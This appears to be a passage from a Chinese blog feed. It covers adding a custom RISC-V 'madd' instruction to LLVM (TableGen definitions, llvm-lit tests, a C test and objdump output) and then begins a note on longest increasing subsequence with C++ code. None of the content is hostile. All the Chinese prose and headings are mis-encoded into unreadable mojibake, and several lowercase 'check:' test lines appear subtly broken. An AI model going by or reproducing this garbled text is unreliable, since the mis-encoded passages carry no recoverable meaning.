<span class="token keyword">class</span> <span class="token class-name">RVInstR</span><span class="token operator">&lt;</span>bits<span class="token operator">&lt;</span><span class="token number">7</span><span class="token operator">></span> funct7<span class="token punctuation">,</span> bits<span class="token operator">&lt;</span><span class="token number">3</span><span class="token operator">></span> funct3<span class="token punctuation">,</span> RISCVOpcode opcode<span class="token punctuation">,</span> dag outs<span class="token punctuation">,</span>
              dag ins<span class="token punctuation">,</span> string opcodestr<span class="token punctuation">,</span> string argstr<span class="token operator">></span>
    <span class="token operator">:</span> RVInst<span class="token operator">&lt;</span>outs<span class="token punctuation">,</span> ins<span class="token punctuation">,</span> opcodestr<span class="token punctuation">,</span> argstr<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> InstFormatR<span class="token operator">></span> <span class="token punctuation">&#123;</span>
  bits<span class="token operator">&lt;</span><span class="token number">5</span><span class="token operator">></span> rs2<span class="token punctuation">;</span>
  bits<span class="token operator">&lt;</span><span class="token number">5</span><span class="token operator">></span> rs1<span class="token punctuation">;</span>
  bits<span class="token operator">&lt;</span><span class="token number">5</span><span class="token operator">></span> rd<span class="token punctuation">;</span>

  let Inst<span class="token punctuation">&#123;</span><span class="token number">31</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> funct7<span class="token punctuation">;</span>
  let Inst<span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> rs2<span class="token punctuation">;</span>
  let Inst<span class="token punctuation">&#123;</span><span class="token number">19</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> rs1<span class="token punctuation">;</span>
  let Inst<span class="token punctuation">&#123;</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> funct3<span class="token punctuation">;</span>
  let Inst<span class="token punctuation">&#123;</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> rd<span class="token punctuation">;</span>
  let Opcode <span class="token operator">=</span> opcode<span class="token punctuation">.</span>Value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŒ‡å®š OPC_OP ä¸º opcodeï¼Œfunc7 ä¸º 0b1111111ï¼Œfunc3 ä¸º 0b111ï¼Œå¯„å­˜å™¨ç”¨ 5 ä½è¡¨ç¤ºï¼ˆçº¦æŸä¸º GPR å¯„å­˜å™¨ï¼‰</p>
<h2 id="æŒ‡ä»¤-Pattern"><a href="#æŒ‡ä»¤-Pattern" class="headerlink" title="æŒ‡ä»¤ Pattern"></a>æŒ‡ä»¤ Pattern</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Add New MADD Pattern</span>
def <span class="token operator">:</span> Pat<span class="token operator">&lt;</span><span class="token punctuation">(</span>add GPR<span class="token operator">:</span>$rs1<span class="token punctuation">,</span> <span class="token punctuation">(</span>mul GPR<span class="token operator">:</span>$rs1<span class="token punctuation">,</span> GPR<span class="token operator">:</span>$rs2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>MADD GPR<span class="token operator">:</span>$rs1<span class="token punctuation">,</span> GPR<span class="token operator">:</span>$rs2<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="å®éªŒç»“æœ-x2F-æµ‹è¯•ç¨‹åº"><a href="#å®éªŒç»“æœ-x2F-æµ‹è¯•ç¨‹åº" class="headerlink" title="å®éªŒç»“æœ&#x2F;æµ‹è¯•ç¨‹åº"></a>å®éªŒç»“æœ&#x2F;æµ‹è¯•ç¨‹åº</h2><h3 id="llvm-lit-æµ‹è¯•ç¨‹åº"><a href="#llvm-lit-æµ‹è¯•ç¨‹åº" class="headerlink" title="llvm-lit æµ‹è¯•ç¨‹åº"></a>llvm-lit æµ‹è¯•ç¨‹åº</h3><ul>
<li><input checked="" disabled="" type="checkbox"> èƒ½å¤Ÿé€šè¿‡è‡ªå·±ç¼–å†™çš„è‡³å°‘2ä¸ªæ­£ç¡®æ±‡ç¼–æµ‹è¯•ç¨‹åºï¼Œç”Ÿæˆæ­£ç¡®çš„maddæŒ‡ä»¤ç¼–ç ï¼ˆ4åˆ†ï¼‰</li>
<li><input checked="" disabled="" type="checkbox"> èƒ½å¤Ÿé€šè¿‡è‡ªå·±ç¼–å†™çš„è‡³å°‘2ä¸ªé”™è¯¯æ±‡ç¼–æµ‹è¯•ç¨‹åºï¼Œè¿›è¡Œé€‚å½“çš„é”™è¯¯å¤„ç†ï¼ˆ4åˆ†ï¼‰</li>
</ul>
<h4 id="æ­£ç¡®çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•"><a href="#æ­£ç¡®çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•" class="headerlink" title="æ­£ç¡®çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•"></a>æ­£ç¡®çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•</h4><p><code>llvm/test/MC/RISCV/rv32m-valid.s</code></p>
<p>æœ€åä¸¤æ¡æŒ‡ä»¤æ˜¯æ–°å¢çš„æµ‹è¯•æ ·ä¾‹</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># RUN: llvm-mc %s -triple&#x3D;riscv32 -mattr&#x3D;+m -riscv-no-aliases -show-encoding \
# RUN:     | FileCheck -check-prefixes&#x3D;CHECK-ASM,CHECK-ASM-AND-OBJ %s
# RUN: llvm-mc %s -triple&#x3D;riscv64 -mattr&#x3D;+m -riscv-no-aliases -show-encoding \
# RUN:     | FileCheck -check-prefixes&#x3D;CHECK-ASM,CHECK-ASM-AND-OBJ %s
# RUN: llvm-mc -filetype&#x3D;obj -triple&#x3D;riscv32 -mattr&#x3D;+m &lt; %s \
# RUN:     | llvm-objdump --mattr&#x3D;+m -M no-aliases -d -r - \
# RUN:     | FileCheck --check-prefix&#x3D;CHECK-ASM-AND-OBJ %s
# RUN: llvm-mc -filetype&#x3D;obj -triple&#x3D;riscv64 -mattr&#x3D;+m &lt; %s \
# RUN:     | llvm-objdump --mattr&#x3D;+m -M no-aliases -d -r - \
# RUN:     | FileCheck --check-prefix&#x3D;CHECK-ASM-AND-OBJ %s

# CHECK-ASM-AND-OBJ: mul a4, ra, s0
# CHECK-ASM: encoding: [0x33,0x87,0x80,0x02]
mul a4, ra, s0
# CHECK-ASM-AND-OBJ: mulh ra, zero, zero
# CHECK-ASM: encoding: [0xb3,0x10,0x00,0x02]
mulh x1, x0, x0
# CHECK-ASM-AND-OBJ: mulhsu t0, t2, t1
# CHECK-ASM: encoding: [0xb3,0xa2,0x63,0x02]
mulhsu t0, t2, t1
# CHECK-ASM-AND-OBJ: mulhu a5, a4, a3
# CHECK-ASM: encoding: [0xb3,0x37,0xd7,0x02]
mulhu a5, a4, a3
# CHECK-ASM-AND-OBJ: div s0, s0, s0
# CHECK-ASM: encoding: [0x33,0x44,0x84,0x02]
div s0, s0, s0
# CHECK-ASM-AND-OBJ: divu gp, a0, a1
# CHECK-ASM: encoding: [0xb3,0x51,0xb5,0x02]
divu gp, a0, a1
# CHECK-ASM-AND-OBJ: rem s2, s2, s8
# CHECK-ASM: encoding: [0x33,0x69,0x89,0x03]
rem s2, s2, s8
# CHECK-ASM-AND-OBJ: remu s2, s2, s8
# CHECK-ASM: encoding: [0x33,0x79,0x89,0x03]
remu x18, x18, x24

# CHECK-ASM-AND-OBJ: madd a0, a1, a2
# CHECK-ASM: encoding: [0x33,0xf5,0xc5,0xfe] 
madd a0, a1, a2
# CHECK-ASM-AND-OBJ: madd ra, ra, ra
# CHECK-ASM: encoding: [0xb3,0xf0,0x10,0xfe]
madd ra, ra, ra<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rt@rogerthat ~&#x2F;m&#x2F;llvm-project-llvmorg-13.0.0 (master)&gt; llvm-lit llvm&#x2F;test&#x2F;MC&#x2F;RISCV&#x2F;rv32m-valid.s 
-- Testing: 1 tests, 1 workers --
PASS: LLVM :: MC&#x2F;RISCV&#x2F;rv32m-valid.s (1 of 1)

Testing Time: 0.11s
  Passed: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="é”™è¯¯çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•"><a href="#é”™è¯¯çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•" class="headerlink" title="é”™è¯¯çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•"></a>é”™è¯¯çš„æŒ‡ä»¤ç¼–ç æµ‹è¯•</h4><p><code>llvm/test/MC/RISCV/rv32m-invalid.s</code></p>
<p>æœ€å4æ¡æ–°å¢çš„æµ‹è¯•æŒ‡ä»¤</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># RUN: not llvm-mc -triple riscv32 -mattr&#x3D;+m &lt; %s 2&gt;&amp;1 | FileCheck %s

# RV64M instructions can&#39;t be used for RV32
mulw ra, sp, gp # CHECK: :[[@LINE]]:1: error: instruction requires the following: RV64I Base Instruction Set
divw tp, t0, t1 # CHECK: :[[@LINE]]:1: error: instruction requires the following: RV64I Base Instruction Set
divuw t2, s0, s2 # CHECK: :[[@LINE]]:1: error: instruction requires the following: RV64I Base Instruction Set
remw a0, a1, a2 # CHECK: :[[@LINE]]:1: error: instruction requires the following: RV64I Base Instruction Set
remuw a3, a4, a5 # CHECK: :[[@LINE]]:1: error: instruction requires the following: RV64I Base Instruction Set

maddw a0, a1, a2 # CHECK: :[[@LINE]]:1: error: instruction requires the following: RV64I Base Instruction Set

# RV32M operands can&#39;t be Imm or float regs
madd a0, a1, 1  # check: :[[@line]]:14: error: invalid Imm operand for instruction: gpr is needed 
madd a0, 1, a1  # check: :[[@line]]:10: error: invalid Imm operand for instruction: gpr is needed 
madd a0, f0, a1 # check: :[[@line]]:10: error: invalid rs1 for instruction: gpr is needed
madd a0, a1, f1 # check: :[[@line]]:14: error: invalid rs2 for instruction: gpr is needed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="æµ‹è¯•ç»“æœ-1"><a href="#æµ‹è¯•ç»“æœ-1" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rt@rogerthat ~&#x2F;m&#x2F;llvm-project-llvmorg-13.0.0 (master)&gt; llvm-lit llvm&#x2F;test&#x2F;MC&#x2F;RISCV&#x2F;rv32m-invalid.s 
-- Testing: 1 tests, 1 workers --
PASS: LLVM :: MC&#x2F;RISCV&#x2F;rv32m-invalid.s (1 of 1)

Testing Time: 0.03s
  Passed: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Cè¯­è¨€æµ‹è¯•ç¨‹åº"><a href="#Cè¯­è¨€æµ‹è¯•ç¨‹åº" class="headerlink" title="Cè¯­è¨€æµ‹è¯•ç¨‹åº"></a>Cè¯­è¨€æµ‹è¯•ç¨‹åº</h3><ul>
<li><p><input checked="" disabled="" type="checkbox"> 
èƒ½å¤Ÿé€šè¿‡è‡ªå·±ç¼–å†™çš„è‡³å°‘1ä¸ªCè¯­è¨€æµ‹è¯•ç¨‹åºï¼Œç”Ÿæˆæ­£ç¡®çš„maddæ±‡ç¼–æŒ‡ä»¤ï¼ˆ4åˆ†ï¼‰</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
å¯ä»¥ç»™ llvm å‰ç«¯ä¹Ÿæ·»åŠ ç›¸åº”çš„æ”¯æŒï¼Œæ”¯æŒé«˜çº§è¯­è¨€çš„å†…è”æ±‡ç¼–æˆ–è€…å†…ç½®å‡½æ•°ç”Ÿæˆå¯¹åº”çš„æ±‡ç¼–</p>
</li>
</ul>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"madd x1, x1, x1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> c<span class="token punctuation">;</span>
    c<span class="token operator">=</span><span class="token function">__builtin_riscv_madd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    c <span class="token operator">=</span> a<span class="token operator">*</span>b<span class="token operator">+</span>b<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹åˆ°åŒæ—¶æµ‹è¯•äº†å†…è”æ±‡ç¼–å’Œå†…ç½®å‡½æ•°ï¼ˆbuiltin functionï¼‰</p>
<p>ç¼–è¯‘é€‰é¡¹ï¼Œä¸é“¾æ¥åªç”Ÿæˆ obj</p>
<p><code>clang --target=riscv32 -march=rv32g -c -o riscv-test.o riscv-test.c</code></p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">rt@rogerthat ~&#x2F;m&#x2F;test&gt; llvm-objdump -d riscv-test.o

riscv-test.o:   file format elf32-littleriscv

Disassembly of section .text:

00000000 &lt;main&gt;:
       0: 13 01 01 fe   addi    sp, sp, -32
       4: 23 2e 11 00   sw      ra, 28(sp)
       8: 23 2c 81 00   sw      s0, 24(sp)
       c: 13 04 01 02   addi    s0, sp, 32
      10: 13 05 00 00   mv      a0, zero
      14: 23 2a a4 fe   sw      a0, -12(s0)
      18: b3 f0 10 fe   madd    ra, ra, ra
      1c: 93 05 10 00   addi    a1, zero, 1
      20: 23 28 b4 fe   sw      a1, -16(s0)
      24: 93 05 20 00   addi    a1, zero, 2
      28: 23 26 b4 fe   sw      a1, -20(s0)
      2c: 83 25 04 ff   lw      a1, -16(s0)
      30: 03 26 c4 fe   lw      a2, -20(s0)
      34: b3 f5 c5 fe   madd    a1, a1, a2
      38: 23 24 b4 fe   sw      a1, -24(s0)
      3c: 03 26 04 ff   lw      a2, -16(s0)
      40: 83 25 c4 fe   lw      a1, -20(s0)
      44: b3 f5 c5 fe   madd    a1, a1, a2
      48: 23 24 b4 fe   sw      a1, -24(s0)
      4c: 03 24 81 01   lw      s0, 24(sp)
      50: 83 20 c1 01   lw      ra, 28(sp)
      54: 13 01 01 02   addi    sp, sp, 32
      58: 67 80 00 00   ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹å‡ºç¨‹åºæ­£ç¡®ç”Ÿæˆï¼Œä¸”æˆæœå®ç°äº†å¯¹å‚æ•° aï¼Œbï¼Œc è°ƒç”¨ madd æŒ‡ä»¤ï¼Œä»¥åŠ DAG é€‰æ‹©çš„æ˜ å°„ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol>
<li><p><a href="https://sourcecodeartisan.com/2020/09/13/llvm-backend-0.html">How to Write an LLVM Backend</a></p>
</li>
<li><p><a href="https://llvm.liuxfe.com/post/28115">LLVMæµ‹è¯•æ¡†æ¶</a></p>
</li>
<li><p><a href="https://reviews.llvm.org/D99320?id=334322#2655389">Add intrinsic for Zbb extension</a></p>
</li>
<li><p><a href="https://feng-qi.github.io/2017/06/14/clang-llvm-compile-command/">LLVM COMMAND</a></p>
</li>
</ol>
<h1 id="æ‹“å±•èµ„æ–™"><a href="#æ‹“å±•èµ„æ–™" class="headerlink" title="æ‹“å±•èµ„æ–™"></a>æ‹“å±•èµ„æ–™</h1><ol>
<li><a href="https://discourse.llvm.org/t/how-to-run-clang-llvm-for-riscv-target-machine-for-bitmanip-extension/64662">How to run Clang-LLVM for RISCV target machine for Bitmanip extension</a></li>
</ol>
<h1 id="å¯èƒ½å­˜åœ¨çš„é”™è¯¯å¤„ç†"><a href="#å¯èƒ½å­˜åœ¨çš„é”™è¯¯å¤„ç†" class="headerlink" title="å¯èƒ½å­˜åœ¨çš„é”™è¯¯å¤„ç†"></a>å¯èƒ½å­˜åœ¨çš„é”™è¯¯å¤„ç†</h1><ol>
<li>ç¼–è¯‘æ—¶ signal 9 æ€è¿›ç¨‹ -&gt; å†…å­˜&#x2F;ç¡¬ç›˜ä¸å¤Ÿç”¨çš„æƒ…å†µã€‚ä¼šå‘ç°é“¾æ¥æ—¶ä¼šåœ¨ &#x2F;tmp ä¸­åˆ›å»ºæ–‡ä»¶ï¼Œå†…å­˜ä¸å¤ŸåŠ äº¤æ¢åˆ†åŒºï¼Œç¡¬ç›˜ä¸å¤Ÿåˆ™ç»™ &#x2F;tmp æŒ‚è½½çš„é€»è¾‘å·åŠ ç©ºé—´ï¼ˆå¦‚æœå¯è¡Œï¼‰ã€‚</li>
</ol>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
        <tag>project</tag>
        <tag>ISA</tag>
      </tags>
  </entry>
  <entry>
    <title>ç®—æ³•å­¸ç¿’ç¬”è®°</title>
    <url>/2023/10/18/Dynamic%20Programming/</url>
    <content><![CDATA[<h1 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h1><h2 id="æœ€é•¿é€’å¢å­åºåˆ—é—®é¢˜ï¼ˆLongest-Increasing-Subsequenceï¼‰"><a href="#æœ€é•¿é€’å¢å­åºåˆ—é—®é¢˜ï¼ˆLongest-Increasing-Subsequenceï¼‰" class="headerlink" title="æœ€é•¿é€’å¢å­åºåˆ—é—®é¢˜ï¼ˆLongest Increasing Subsequenceï¼‰"></a>æœ€é•¿é€’å¢å­åºåˆ—é—®é¢˜ï¼ˆLongest Increasing Subsequenceï¼‰</h2><blockquote>
<p><strong>å­åºåˆ—</strong> æ˜¯ç”±æ•°ç»„æ´¾ç”Ÿè€Œæ¥çš„åºåˆ—ï¼Œåˆ é™¤ï¼ˆæˆ–ä¸åˆ é™¤ï¼‰æ•°ç»„ä¸­çš„å…ƒç´ è€Œä¸æ”¹å˜å…¶ä½™å…ƒç´ çš„é¡ºåºã€‚ä¾‹å¦‚ï¼Œ<code>[3,6,2,7]</code> æ˜¯æ•°ç»„ <code>[0,3,1,6,2,2,7]</code> çš„å­åºåˆ—ã€‚</p>
</blockquote>
<p>è¿™æ˜¯æˆ‘å†™çš„ä»£ç ï¼ˆæœ‰ç‚¹å·®åŠ²çš„ä»£ç </p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> dp<span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token function">tryThrough</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0x80000000</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                res <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> <span class="token function">lengthOfLIS</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        dp<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            dp<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">>=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token operator">&amp;</span> tmp <span class="token operator">:</span> dp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token function">tryThrough</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å†™çš„è¿‡ç¨‹ä¸­å‡ºç°äº†ä¸€ä¸‹å‡ ä¸ªé—®é¢˜</p>
<ul>
<li>tryThrough å‡½æ•°ä¸­æŠŠ dp[i] å†™æˆ nums[i]ï¼Œé—å¿˜äº†éœ€è¦éå†çš„æ˜¯å­åºåˆ—çš„é•¿åº¦</li>
<li>lengthOfLIS ä¸­ä¸€å¼€å§‹ä¹ æƒ¯æ€§çš„è®¤ä¸ºéœ€è¦å‰ä¸¤ä¸ªå…ƒç´  dp[0] å’Œ dp[1]ï¼Œè€Œä¸”æƒ³å½“ç„¶çš„è®¤ä¸º dp[1] ç­‰ä¸€ 1ï¼Œå®é™…ä¸Šæˆ‘ä¸€è¾¹è®¤ä¸º dp[0] åº”è¯¥æ˜¯æŸç§è™šçš„æœ€é•¿å­åºåˆ—ï¼Œå¦ä¸€è¾¹æˆ‘è®¤ä¸º dp[i] è¡¨ç¤ºé•¿åº¦ i+1 çš„ä»¥ nums[i] ç»“å°¾çš„æœ€é•¿å­åºåˆ—ã€‚</li>
<li>åœ¨å¤„ç† <code>dp[j] &gt;= dp[i]</code> æ—¶ï¼Œå†™æˆäº† <code>dp[j] &gt; dp[i]</code>ï¼Œæƒ³å½“ç„¶çš„è®¤ä¸ºå¤§äºæ‰èƒ½é€’å¢ï¼Œå®é™…ä¸Šå¯èƒ½å­˜åœ¨ç›¸ç­‰çš„æƒ…å†µï¼Œè¿™é‡Œæ­£ç¡®çš„é€»è¾‘åº”è¯¥æ˜¯ <code>max(dp[i],dp[j]+1)</code></li>
</ul>
<p>å†æ¥çœ‹ä¸€ä¸‹ä¼˜ç§€ä»£ç ï¼Œleetcode å®˜ç½‘çš„ä¼˜é›…ä»£ç </p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> <span class="token function">lengthOfLIS</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>dp<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
